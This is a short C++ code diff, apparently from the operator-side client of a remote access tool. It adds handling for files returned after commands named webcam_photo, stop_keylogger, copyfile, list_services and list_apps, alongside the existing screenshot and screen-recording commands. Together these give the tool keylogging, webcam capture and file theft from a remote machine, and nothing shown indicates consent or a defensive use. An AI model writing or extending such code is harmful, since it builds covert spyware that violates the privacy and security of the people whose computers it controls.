@@ -199,9 +199,14 @@ int main()
         std::string response(buffer);
         std::cout << "Server response: " << response << std::endl;
         
-        // Check if server is sending a file (for screenshot or recording)
+        // Check if server is sending a file (for screenshot, recording, webcam, keylogger, copyfile, list commands)
         if ((cmd == "screenshot" && response.find("Screenshot captured successfully") != std::string::npos) ||
-            (cmd == "stop_record" && response.find("Screen recording stopped") != std::string::npos))
+            (cmd == "stop_record" && response.find("Screen recording stopped") != std::string::npos) ||
+            (cmd == "webcam_photo" && response.find("Webcam photo captured successfully") != std::string::npos) ||
+            (cmd == "stop_keylogger" && response.find("Keylogger stopped") != std::string::npos) ||
+            (cmd.find("copyfile") == 0 && response.find("File copied successfully") != std::string::npos) ||
+            (cmd == "list_services" && response.find("process_list.txt") != std::string::npos) ||
+            (cmd == "list_apps" && response.find("list_apps.txt") != std::string::npos))
         {
             std::cout << "Waiting to receive file from server..." << std::endl;
             if (receiveFile(sock))
